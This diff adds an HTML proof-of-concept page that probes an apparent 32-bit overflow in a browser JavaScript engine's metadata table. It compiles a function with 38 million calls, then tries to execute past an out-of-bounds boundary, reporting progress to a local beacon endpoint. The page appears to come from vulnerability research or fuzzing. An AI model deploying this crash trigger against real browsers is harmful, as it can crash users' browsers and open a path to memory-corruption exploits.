@@ -1,0 +1,94 @@
+<!--
+  p615e: MetadataTable overflow — 38M ONLY, direct test
+
+  Previous results:
+  - 1M calls: OK (metadata 112MB, linking ~0.1s)
+  - 2M calls: OK (metadata 224MB, linking ~1.7s)
+  - 5M calls: CRASH (metadata 560MB = OOM)
+  - 38M calls: NEVER TESTED IN ISOLATION
+
+  Key insight: 38M's MetadataTable is ONLY 100KB (32-bit overflow!).
+  That's SMALLER than 1M's 112MB. Memory is NOT the bottleneck.
+  The question: does the O(N) linking time (~32s extrapolated) hit the
+  browser's script timeout?
+
+  This probe: compile 38M, attempt execution with bail at 5.
+  No other tests. Clean memory state.
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p615e</title>
+<script>
+function b(m) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/' + encodeURIComponent(m), false);
+    x.send();
+  } catch(e) {
+    try { new Image().src = '/beacon/' + encodeURIComponent('XFAIL-' + m); } catch(e2){}
+  }
+}
+
+(function() {
+b('P615E-START');
+
+// Build 38,348,816 x() source string
+b('P615E-SOURCE');
+var source;
+try {
+  source = 'x();'.repeat(38348816);
+} catch(e) {
+  try {
+    var chunks = [];
+    var CHUNK = 100000;
+    var full = Math.floor(38348816 / CHUNK);
+    var rem = 38348816 % CHUNK;
+    var one = 'x();'.repeat(CHUNK);
+    for (var i = 0; i < full; i++) chunks.push(one);
+    if (rem > 0) chunks.push('x();'.repeat(rem));
+    source = chunks.join('');
+    chunks = null; one = null;
+  } catch(e2) {
+    b('P615E-SRCFAIL');
+    return;
+  }
+}
+b('P615E-SRCLEN=' + source.length);
+
+// Compile
+b('P615E-COMPILE');
+var fn;
+try {
+  fn = new Function('x', source);
+  source = null;
+} catch(e) {
+  b('P615E-CFAIL=' + String(e).slice(0, 200));
+  return;
+}
+b('P615E-COMPILED');
+
+// Execute — NO beacons in callback, just count + bail
+var count = 0;
+b('P615E-EXEC');
+try {
+  fn(function() { count++; if (count >= 5) throw 'bail'; });
+} catch(e) {
+  b('P615E-CATCH=' + String(e).slice(0, 50));
+}
+b('P615E-CALLS=' + count);
+
+// If we survived, try going past the OOB boundary (893)
+if (count === 5) {
+  b('P615E-PHASE2');
+  var count2 = 0;
+  try {
+    fn(function() { count2++; if (count2 >= 950) throw 'bail'; });
+  } catch(e) {
+    b('P615E-P2-CATCH=' + String(e).slice(0, 50));
+  }
+  b('P615E-P2-CALLS=' + count2);
+}
+
+b('P615E-ALIVE');
+})();
+</script></head><body>p615e: MetadataTable 38M direct test</body></html>
